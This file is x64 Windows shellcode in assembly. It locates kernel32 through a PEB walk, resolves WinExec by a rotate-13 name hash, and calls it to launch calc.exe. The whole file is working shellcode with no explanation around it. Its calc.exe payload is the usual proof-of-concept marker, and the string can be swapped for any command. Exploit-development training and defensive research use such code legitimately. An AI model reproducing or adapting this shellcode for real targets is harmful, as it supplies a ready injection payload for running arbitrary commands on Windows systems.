%use masm

section .data

section .bss

section .text
  global _start                     ; must be declared for linker

_start:

find_kernel32:
    xor rdx, rdx                    ;
    mov rax, gs:[rdx+0x60]          ;    
    mov rsi,[rax+0x18]              ;    
    mov rsi,[rsi + 0x20]            ;    
    mov r9, [rsi]                   ;    
    mov r9, [r9]                    ;    
    mov r9, [r9+0x20]               ;    
    jmp call_winexec                ;

parse_module: 
    mov ecx, dword ptr [r9 + 0x3c]  ; 
    xor r15, r15                    ;
    mov r15b, 0x88                  ;       
    add r15, r9                     ;
    add r15, rcx                    ;
    mov r15d, dword ptr [r15]       ;    
    add r15, r9                     ;     
    mov ecx, dword ptr [r15 + 0x18] ;    
    mov r14d, dword ptr [r15 + 0x20];    
    add r14, r9                     ;    

search_function:    
    jrcxz not_found                 ;    
    dec ecx                         ;    
    xor rsi, rsi                    ;
    mov esi, [r14 + rcx*4]          ;    
    add rsi, r9                     ;    

function_hashing:    
    xor rax, rax                    ;
    xor rdx, rdx                    ;
    cld                             ;    

iteration:     
    lodsb                           ;     
    test al, al                     ;     
    jz compare_hash                 ;     
    ror edx, 0x0d                   ;     
    add edx, eax                    ;     
    jmp iteration                   ;     

compare_hash:     
    cmp edx, r8d                    ;
    jnz search_function             ;     
    mov r10d, [r15 + 0x24]          ;     
    add r10, r9                     ;     
    movzx ecx, word ptr [r10 + 2*rcx];     
    mov r11d, [r15 + 0x1c]          ;    
    add r11, r9                     ;    
    mov eax, [r11 + 4*rcx]          ;    
    add rax, r9                     ;    
    ret                             ;

not_found:
    ret                             ;

call_winexec:
    mov r8d, 0xe8afe98              ; WinExec Hash
    call parse_module               ; Search and obtain address of WinExec
    xor rcx, rcx                    ;
    push rcx                        ;    
    mov rcx, 0x6578652e636c6163     ; exe.clac 
    push rcx                        ;
    lea rcx, [rsp]                  ;     
    xor rdx,rdx                     ;
    inc rdx                         ;     
    sub rsp, 0x28                   ;
    call rax                        ; WinExec
